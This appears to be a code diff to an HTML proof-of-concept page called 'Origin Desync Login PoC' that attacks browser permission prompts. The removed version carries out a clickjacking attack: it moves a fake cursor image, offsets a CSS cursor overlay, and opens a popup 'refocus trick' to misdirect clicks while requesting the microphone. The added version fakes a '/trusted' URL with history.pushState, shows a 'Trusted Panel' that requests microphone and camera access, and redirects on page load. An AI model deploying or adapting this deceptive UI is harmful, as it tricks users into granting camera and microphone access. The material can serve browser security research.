@@ -2,117 +2,120 @@
 <html>
 <head>
 <meta charset="utf-8">
+<title>Origin Desync Login PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-html, body {
-  width: 100%;
-  height: 100%;
+body {
+  margin:0;
+  font-family:system-ui;
+  background:#f5f5f7;
 }
-img {
-  pointer-events: none;
-}
-#button {
-  position: absolute;
-  top: 150px;
-  left: 310px;
+button {
+  margin:6px;
+  font-size:14px;
+  padding:8px 12px;
 }
 #panel {
   display:none;
+  max-width:520px;
+  margin:60px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2);
+}
+pre {
+  margin-top:12px;
+  background:#111;
+  color:#0f0;
+  padding:10px;
+  font-size:11px;
+  max-height:260px;
+  overflow:auto;
+}
+.notice {
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020;
 }
 </style>
 </head>
 
 <body>
 
-<button id="button">Click here</button>
-<img src="cursor.png" id="cursor" style="display:none">
-<div id="panel"></div>
+<div style="text-align:center">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Trusted Panel</h2>
+
+  <button onclick="getMicrophone()">Activate Microphone</button>
+  <p id="micOutput">Microphone: -</p>
+
+  <hr>
+
+  <button onclick="openCamera()">Open Camera</button>
+  <video id="camera" autoplay playsinline></video>
+
+  <div class="notice">
+    Demo only — browser permission required
+  </div>
+</div>
 
 <script>
-const cursor = document.getElementById("cursor");
-const button = document.getElementById("button");
-const panel  = document.getElementById("panel");
+const panel = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
 
-let fakeCursor = false;
-let lastPos = [0,0];
+/* ======================
+   MICROPHONE (GANTI LOKASI)
+====================== */
+function getMicrophone() {
+  const out = document.getElementById('micOutput');
 
-/* =====================
-   CURSOR HANDLING
-===================== */
-document.addEventListener("mousemove", e => {
-  if (!fakeCursor) {
-    document.body.style.cursor = "auto";
-    cursor.style.display = "none";
-    lastPos = [e.clientX, e.clientY];
-  } else {
-    setFakecursor(e.clientX, e.clientY);
-  }
-});
+  navigator.mediaDevices.getUserMedia({ audio:true })
+    .then(stream => {
+      out.textContent = "Microphone: ACTIVE";
 
-function setFakecursor(x, y) {
-  cursor.style.display = "block";
-  cursor.style.position = "absolute";
-  cursor.style.top  = y + "px";
-  cursor.style.left = x + "px";
-
-  const cx = Math.max(Math.min(x - 118 - 155, 128), 0);
-  const cy = Math.max(Math.min(y - 128 + 42, 128), 0);
-
-  document.body.style.cursor =
-    `url('overlay.png') ${cx} ${cy}, auto`;
+      const ctx = new AudioContext();
+      const src = ctx.createMediaStreamSource(stream);
+      src.connect(ctx.destination);
+    })
+    .catch(() => {
+      out.textContent = "Microphone: DENIED";
+    });
 }
 
-/* =====================
-   CLICK HANDLER
-===================== */
-button.addEventListener("mousedown", e =>
-  setFakecursor(e.clientX, e.clientY)
-);
+/* ======================
+   CAMERA (TETAP)
+====================== */
+function openCamera() {
+  navigator.mediaDevices.getUserMedia({ video:true })
+    .then(s => camera.srcObject = s)
+    .catch(()=>alert('Camera denied'));
+}
 
-button.onclick = () => {
-  button.remove();
-  fakeCursor = true;
-  setFakecursor(...lastPos);
-
-  /* 🔥 TRUSTED STATE */
+/* ======================
+   TRUSTED STATE
+====================== */
+trigger.onclick = () => {
   history.pushState({}, '', '/trusted');
   panel.style.display = 'block';
-
-  /* microphone */
-  useMicrophone(() => fakeCursor = false);
-
-  /* refocus trick */
-  const w = window.open("about:blank", null, "popup");
-  setTimeout(() => w.close(), 100);
 };
 
-/* =====================
+/* ======================
    PAGE LIFECYCLE REDIRECT
-===================== */
+====================== */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'https://google.com';
+        location.href = 'https://google.com:9090';
       }, 80);
     });
   });
 });
-
-/* =====================
-   MICROPHONE ONLY
-===================== */
-function useMicrophone(callback) {
-  navigator.mediaDevices.getUserMedia({ audio:true }).then(stream => {
-    callback && callback();
-    const ctx = new AudioContext();
-    const mic = ctx.createMediaStreamSource(stream);
-    mic.connect(ctx.destination);
-    document.body.append("Playing back microphone audio...");
-  });
-}
 </script>
 
 </body>
 </html>
-
-
